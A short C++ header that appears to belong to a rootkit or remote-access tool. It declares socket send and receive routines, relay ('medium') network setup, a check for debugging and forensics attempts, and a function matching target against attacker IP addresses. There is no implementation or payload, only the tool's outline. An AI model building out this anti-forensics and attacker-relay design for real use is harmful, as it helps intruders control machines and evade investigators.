#pragma once

#include "helpers.h"
#define MAXIPV4_ADDRESS_SIZE 16  // 3 * 4 triple digit numbers + 3 dots + null terminator

BOOL IsQuickTerminate(PASS_DATA result);  // function that checks for different debugging and forensics attempts 
namespace root_internet {
	PASS_DATA RecvData(SOCKET GetFrom, int Size, PVOID ToBuf, BOOL Silent, int Flags, LogFile* MediumLog);  // receive data from socket
	PASS_DATA SendData(SOCKET SendTo, PVOID SrcData, int Size, BOOL Silent, int Flags, LogFile* MediumLog);  // send data through socket
	NETWORK_INFO InitNetInfo(sockaddr_in AddrInfo, USHORT Port, const char* IP, SOCKET Sock);  // initiate the network info of the medium and the supposed to be client
	void CleanNetStack(SOCKET SocketToClean, LogFile* MediumLog);  // clean all the sent messages that were not received
	void SetNetStructs(const char* SrvIP, const char* SndIP, USHORT SrvPort, USHORT SndPort, NETWORK_INFO* NetArr);  // set the values of the network structures used for the client and the medium
	BOOL StartComms(NETWORK_INFO* NetArr, LogFile* MediumLog);  // start the communication process with an actual client
}
namespace address_config {
	DWORD CompareIpAddresses(char* LocalHost, const char* RemoteAddr);
	BOOL MatchIpAddresses(char* TargetAddress, char* AttackerAddress, const char* AttackerIps);
}